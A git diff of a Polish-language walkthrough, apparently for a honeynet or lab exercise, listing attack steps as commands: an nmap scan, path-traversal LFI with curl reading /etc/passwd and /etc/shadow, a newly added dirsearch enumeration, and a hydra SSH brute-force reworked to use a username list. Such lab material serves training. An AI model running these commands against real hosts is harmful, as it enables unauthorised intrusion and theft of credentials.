@@ -105,13 +105,18 @@ curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd
 ```
 sudo nmap -sS -sC -p80,443 <Honeynet IP> -vvv
 ```
-2. Wykonaj LFI
+2. Eksploruj znaleziony serwer WWW
+Wykonaj LFI
 ```
 curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
 ```
 Lub:
 ```
 curl --insecure https://<Point IP>/\?filename\=../../../etc/shadow 
+```
+Wyszukaj dodatkową ścieżkę internetową:
+```
+dirsearch --wordlists=/home/user/wordlists/directories.txt -u https://<Point IP>/ 
 ```
 3. Skonfiguruj listę słów
 ```
@@ -120,7 +125,7 @@ nano brute.dict
 ```
 4. Wykonaj bruteforce SSH
 ```
-hydra -l <username> -P brute.dict <IP of the ssh host> ssh -t 4 
+hydra -L brute.dict -P passwords.dict <IP of the ssh host> ssh -t 4 
 ```
 5. Zaloguj się do hosta
 ```
